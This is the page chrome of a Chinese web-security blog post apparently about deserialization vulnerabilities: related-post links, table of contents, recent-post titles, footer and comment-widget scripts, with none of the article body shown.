class="title">TemplatesImpl利用链与内存马</div></div></a></div><div><a href="/2021/08/05/Nginx中间件漏洞之CRLF注入/" title="Nginx中间件漏洞之CRLF注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-05</div><div class="title">Nginx中间件漏洞之CRLF注入</div></div></a></div><div><a href="/2021/08/07/Nginx中间件漏洞之add_header被覆盖/" title="Nginx中间件漏洞之add_header被覆盖"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-07</div><div class="title">Nginx中间件漏洞之add_header被覆盖</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jasson</div><div class="author-info__description">专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">80</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/j-jasson2"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="toc-number">1.0.1.</span> <span class="toc-text">什么是序列化？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="toc-number">1.0.2.</span> <span class="toc-text">什么是反序列化？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">源代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96EXP"><span class="toc-number">5.</span> <span class="toc-text">构造反序列化EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">实战渗透测试反序列化漏洞</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/01/31/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC/" title="TemplatesImpl利用链与内存马"><img src="/images/TemplatesImpl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TemplatesImpl利用链与内存马"/></a><div class="content"><a class="title" href="/2023/01/31/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC/" title="TemplatesImpl利用链与内存马">TemplatesImpl利用链与内存马</a><time datetime="2023-01-31T12:45:41.000Z" title="发表于 2023-01-31 20:45:41">2023-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%88%B0shiro%E6%B3%A8%E5%85%A5WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/" title="反序列化分析到shiro注入WebSocket内存马"><img src="/images/shirows.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反序列化分析到shiro注入WebSocket内存马"/></a><div class="content"><a class="title" href="/2022/12/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%88%B0shiro%E6%B3%A8%E5%85%A5WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/" title="反序列化分析到shiro注入WebSocket内存马">反序列化分析到shiro注入WebSocket内存马</a><time datetime="2022-12-21T12:21:33.000Z" title="发表于 2022-12-21 20:21:33">2022-12-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDgetshell%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="记一次文件下载getshell代码审计"><img src="https://cdn.nlark.com/yuque/0/2022/png/12366538/1665933712004-b1e5833c-2f0f-47a0-bccb-aa58dd2eeed2.png#averageHue=%23282c2d&amp;clientId=ua2bc1d8e-a387-4&amp;from=paste&amp;height=541&amp;id=ueddfd14f&amp;name=image.png&amp;originHeight=1082&amp;originWidth=2168&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=631007&amp;status=done&amp;style=none&amp;taskId=u6aab1ec8-11d2-40fb-b165-640e8d3173d&amp;title=&amp;width=1084" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次文件下载getshell代码审计"/></a><div class="content"><a class="title" href="/2022/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BDgetshell%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="记一次文件下载getshell代码审计">记一次文件下载getshell代码审计</a><time datetime="2022-11-16T06:05:18.000Z" title="发表于 2022-11-16 14:05:18">2022-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/06/%E6%9C%AA%E6%8E%88%E6%9D%83%E3%80%81%E8%B6%8A%E6%9D%83%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/" title="未授权、越权类漏洞探究"><img src="https://cdn.nlark.com/yuque/0/2022/png/12366538/1656467797684-664216b5-ed4f-4482-9923-a0a0b276a129.png#averageHue=%23daa779&amp;clientId=u31016762-981a-4&amp;from=paste&amp;height=399&amp;id=u63564e6d&amp;name=image.png&amp;originHeight=639&amp;originWidth=708&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=191969&amp;status=done&amp;style=none&amp;taskId=uc054a173-f9fd-4d92-bba8-ca590027a95&amp;title=&amp;width=442" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="未授权、越权类漏洞探究"/></a><div class="content"><a class="title" href="/2022/07/06/%E6%9C%AA%E6%8E%88%E6%9D%83%E3%80%81%E8%B6%8A%E6%9D%83%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/" title="未授权、越权类漏洞探究">未授权、越权类漏洞探究</a><time datetime="2022-07-06T06:05:18.000Z" title="发表于 2022-07-06 14:05:18">2022-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BD%9C%E6%9F%90OA%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="漏洞分析｜某OA历史漏洞复现分析"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2020.cnblogs.com%2Fblog%2F1827892%2F202004%2F1827892-20200406173605663-468610130.png&amp;refer=http%3A%2F%2Fimg2020.cnblogs.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1644054500&amp;t=67d36ee9895f6e0842b997b7940005b6" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="漏洞分析｜某OA历史漏洞复现分析"/></a><div class="content"><a class="title" href="/2021/12/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BD%9C%E6%9F%90OA%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="漏洞分析｜某OA历史漏洞复现分析">漏洞分析｜某OA历史漏洞复现分析</a><time datetime="2021-12-30T02:45:41.000Z" title="发表于 2021-12-30 10:45:41">2021-12-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023  <i id="heartbeat" class="fa fas fa-heartbeat"></i> jasson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ezr37wKgCkQA0GoJHntOvgbB-MdYXbMMI',
+      appKey: '7waFMOWmYb026lMWzexxu7RF',
+      placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer src="/live2d-widget/autoload.js"></script><script defer src="/js/phone.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="富强,明主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
